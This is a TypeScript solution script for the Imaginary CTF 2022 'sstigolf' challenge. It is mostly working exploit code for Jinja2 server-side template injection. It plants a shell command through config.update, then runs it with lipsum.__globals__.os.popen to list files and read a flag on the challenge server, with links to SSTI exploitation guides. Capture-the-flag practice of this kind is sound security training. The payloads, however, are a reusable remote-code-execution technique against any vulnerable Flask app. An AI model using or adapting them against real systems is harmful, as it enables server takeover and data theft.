/* Imaginary CTF 2022: http://sstigolf.chal.imaginaryctf.org/ */

// --- SSTI ---
// https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#exploit
// https://hackmd.io/@Chivato/HyWsJ31dI
// https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
// https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/

// --- JINJA ---
// https://jinja.palletsprojects.com/en/3.0.x/templates/#expressions
// https://jinja.palletsprojects.com/en/3.0.x/templates/#list-of-builtin-filters



// Our exploit; we want to list all the files in the root directory of the server



// STEP 1: Update config variable with payload
const updateConfig = async (payloadKey: string) => {
    const flagFilename = 'an_arbitrarily_named_file';
    let payload = `url_for.__globals__.os.read(url_for.__globals__.os.open('${flagFilename}', url_for.__globals__.os.O_RDONLY), 50)`;
    payload = `ls -la`; // worked
    payload = `cat ${flagFilename}`; // error
    payload = `cat an_arbitrarily_named_file` // SOLUTION
    let query = `{{config.update(${payloadKey}=request.args.get('${payloadKey}'))}}`;
    console.assert(query.length < 49);
    const baseURL = 'https://sstigolf.ictf2022.iciaran.com/';
    let targetURL = new URL(`${baseURL}/ssti?${payloadKey}=${payload}&query=${query}`);

    const response = await fetch(targetURL);
    const responseText = await response.text();
    console.log(responseText);
}
const payloadKey = 'p';
updateConfig(payloadKey);


// STEP 2: Confirm payload exists on config object
const confirmPayload = async (payloadKey: string) => {
    const baseURL = 'https://sstigolf.ictf2022.iciaran.com/';
    let query = `{{config.${payloadKey}}}`;
    let targetURL = new URL(`${baseURL}/ssti?query=${query}`);
    const confirmation = await fetch(targetURL);
    const confirmationText = await confirmation.text();
    console.log({confirmationText});
}
setTimeout(() => confirmPayload(payloadKey), 3000);


// STEP 3: Use os.popen to run payload
const runPayload = async (payloadKey: string) => {
    const baseURL = 'https://sstigolf.ictf2022.iciaran.com/';
    let query = `{{url_for.__globals__.os.popen(config.${payloadKey}).read()}}`;
    query = `{{lipsum.__globals__.os.popen(config.${payloadKey}).read()}}`;
    console.log('Query length', query.length);
    console.assert(query.length <= 49);
    let targetURL = new URL(`${baseURL}/ssti?query=${query}`);
    const flag = await fetch(targetURL);
    const flagText = await flag.text();
    console.log({flagText});
}
setTimeout(() => runPayload(payloadKey), 5000);

export {};